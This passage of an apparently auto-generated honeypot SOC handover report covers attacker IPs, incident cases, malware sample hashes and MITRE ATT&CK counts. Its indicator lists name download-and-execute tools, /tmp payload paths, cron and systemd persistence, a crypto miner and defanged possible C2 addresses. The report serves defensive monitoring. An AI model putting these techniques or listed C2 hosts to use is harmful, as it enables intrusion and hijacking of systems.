| IR-28fae5820ffd | HIGH | `193.105.131[.]7` | 2026-11-26 02:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5f1b5cd8f9b6 | HIGH | `193.105.131[.]7` | 2026-11-26 02:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2983e8a4e6b2 | HIGH | `81.250.184[.]144` | 2026-11-26 03:04 | Y | 0 | 0 | `T1078` |
| IR-46332703bd66 | HIGH | `82.38.134[.]89` | 2026-11-26 03:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a9a22b882085 | HIGH | `77.90.185[.]29` | 2026-11-26 03:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b3bf786db1f6 | HIGH | `138.226.239[.]234` | 2026-11-26 03:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-364c1903d6fe | HIGH | `92.118.39[.]64` | 2026-11-26 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0cb0b5ec52ef | HIGH | `193.3.23[.]253` | 2026-11-26 03:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8c1897f97389 | HIGH | `193.3.23[.]253` | 2026-11-26 03:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55bbc2a3eaf7 | HIGH | `189.190.183[.]204` | 2026-11-26 03:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eaba96271354 | HIGH | `189.190.183[.]204` | 2026-11-26 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f9fe62fde855 | HIGH | `109.160.32[.]124` | 2026-11-26 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c5f78c18fe5c | HIGH | `176.53.159[.]196` | 2026-11-26 04:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3e49a25fedc6 | HIGH | `2.57.122[.]150` | 2026-11-26 04:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2a9017254183 | HIGH | `217.60.242[.]22` | 2026-11-26 04:04 | Y | 1 | 0 | `T1078` |
| IR-2745492e9ac8 | HIGH | `2.57.122[.]150` | 2026-11-26 04:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-59aa76fe1805 | HIGH | `2.57.122[.]150` | 2026-11-26 04:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-76419e264eaa | HIGH | `2.57.122[.]150` | 2026-11-26 04:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9eda3a5874b9 | HIGH | `2.57.122[.]150` | 2026-11-26 04:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-77e81b1736b1 | HIGH | `2.57.122[.]150` | 2026-11-26 04:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6c83f5100c2b | HIGH | `2.57.122[.]150` | 2026-11-26 04:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1570ba693b7b | HIGH | `2.57.122[.]150` | 2026-11-26 04:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bde7038160d1 | HIGH | `2.57.122[.]150` | 2026-11-26 04:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-aa10a52f8caa | HIGH | `2.57.122[.]150` | 2026-11-26 04:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d9ee9e67fa65 | HIGH | `2.57.122[.]150` | 2026-11-26 04:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-98af75d3df3d | HIGH | `35.210.65[.]179` | 2026-11-26 04:21 | Y | 3 | 0 | `T1078` |
| IR-ca2cec7a346a | HIGH | `2.57.122[.]150` | 2026-11-26 04:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7cc694da1d50 | HIGH | `160.119.66[.]206` | 2026-11-26 04:23 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-6c51c0b64cd9 | HIGH | `160.119.66[.]206` | 2026-11-26 04:23 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-79b74c379fd1 | HIGH | `2.57.122[.]150` | 2026-11-26 04:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-25be24f20b24 | HIGH | `2.57.122[.]150` | 2026-11-26 04:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-feb0ce89815f | HIGH | `35.206.167[.]114` | 2026-11-26 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b9d53d87689b | HIGH | `23.132.164[.]185` | 2026-11-26 04:29 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bac1705b5497 | HIGH | `2.57.122[.]150` | 2026-11-26 04:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c80a7a60955c | HIGH | `2.57.122[.]150` | 2026-11-26 04:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-127cbd9564a7 | HIGH | `2.57.122[.]150` | 2026-11-26 04:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9a1eb22217ce | HIGH | `35.210.23[.]177` | 2026-11-26 04:32 | Y | 3 | 0 | `T1078` |
| IR-71d6297c1f8b | HIGH | `2.57.122[.]150` | 2026-11-26 04:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ebfb03173d96 | HIGH | `2.57.122[.]150` | 2026-11-26 04:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 13 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]124` | **2** | 2026-11-26 01:13 | 2026-11-26 03:06 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-11-26 03:58 | 2026-11-26 04:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `100.27.199[.]247` | 1 | 2026-11-26 01:18 | 2026-11-26 01:18 | 1s | 0 | `T1592` | 🟢 LOW |
| `103.29.70[.]204` | 1 | 2026-11-26 04:51 | 2026-11-26 04:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `112.168.176[.]15` | 1 | 2026-11-26 01:35 | 2026-11-26 01:36 | 18s | 0 | `T1592` | 🟢 LOW |
| `119.199.157[.]77` | 1 | 2026-11-26 04:13 | 2026-11-26 04:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-26 00:06 | 2026-11-26 00:06 | 36s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-26 03:25 | 2026-11-26 03:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]40` | 1 | 2026-11-26 02:57 | 2026-11-26 02:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-26 04:33 | 2026-11-26 04:34 | 36s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | 1 | 2026-11-26 03:28 | 2026-11-26 03:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-26 04:16 | 2026-11-26 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.204[.]157` | 1 | 2026-11-26 00:11 | 2026-11-26 00:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-11-26 01:20 | 2026-11-26 01:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.251.121[.]142` | 1 | 2026-11-26 01:09 | 2026-11-26 01:09 | 46s | 0 | `T1592` | 🟢 LOW |
| `20.62.252[.]16` | 1 | 2026-11-26 02:50 | 2026-11-26 02:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.63.225[.]145` | 1 | 2026-11-26 00:05 | 2026-11-26 00:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.60.242[.]22` | 1 | 2026-11-26 00:49 | 2026-11-26 00:49 | 5s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-26 04:29 | 2026-11-26 04:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.109.206[.]127` | 1 | 2026-11-26 02:29 | 2026-11-26 02:29 | 24s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-26 04:13 | 2026-11-26 04:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.167[.]114` | 1 | 2026-11-26 04:26 | 2026-11-26 04:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.216[.]67` | 1 | 2026-11-26 04:53 | 2026-11-26 04:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.23[.]177` | 1 | 2026-11-26 04:32 | 2026-11-26 04:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.65[.]179` | 1 | 2026-11-26 04:21 | 2026-11-26 04:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-26 02:49 | 2026-11-26 02:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `46.29.26[.]185` | 1 | 2026-11-26 00:40 | 2026-11-26 00:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.29.26[.]193` | 1 | 2026-11-26 00:20 | 2026-11-26 00:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.24.233[.]67` | 1 | 2026-11-26 03:36 | 2026-11-26 03:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]148` | 1 | 2026-11-26 01:08 | 2026-11-26 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-11-26 00:28 | 2026-11-26 00:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]80` | 1 | 2026-11-26 01:22 | 2026-11-26 01:22 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]152` | 1 | 2026-11-26 01:44 | 2026-11-26 01:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]187` | 1 | 2026-11-26 00:39 | 2026-11-26 00:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]110` | 1 | 2026-11-26 00:37 | 2026-11-26 00:37 | 18s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]245` | 1 | 2026-11-26 00:15 | 2026-11-26 00:15 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]240` | 1 | 2026-11-26 00:37 | 2026-11-26 00:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.127.19[.]244` | 1 | 2026-11-26 00:09 | 2026-11-26 00:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-26 02:43 | 2026-11-26 02:43 | 6s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]64` | 1 | 2026-11-26 03:15 | 2026-11-26 03:15 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.189.208[.]13` | VN | TEDEV TECHNOLOGICAL DEVELOPMENT COMPANY LIMITED | **100** ⚠️ | 50 |
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `112.168.176[.]15` | KR | Korea Telecom | **100** ⚠️ | 26 |
| `211.63.225[.]145` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `69.127.19[.]244` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 5 |
| `35.206.167[.]114` | BE | Google LLC | **100** ⚠️ | 25 |
| `35.210.216[.]67` | BE | Google LLC | **100** ⚠️ | 34 |
| `4.240.126[.]25` | IN | Microsoft Corporation | **100** ⚠️ | 50 |
| `62.60.130[.]148` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |
| `65.49.1[.]152` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 149 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 142 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 79 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 18 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 5 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 208 cases |
| Tool 34  | Credential Extractor        | ✅ 1466 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 88 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 86 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 138 priority case(s) shown individually · 40 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-26T05:52:53Z_
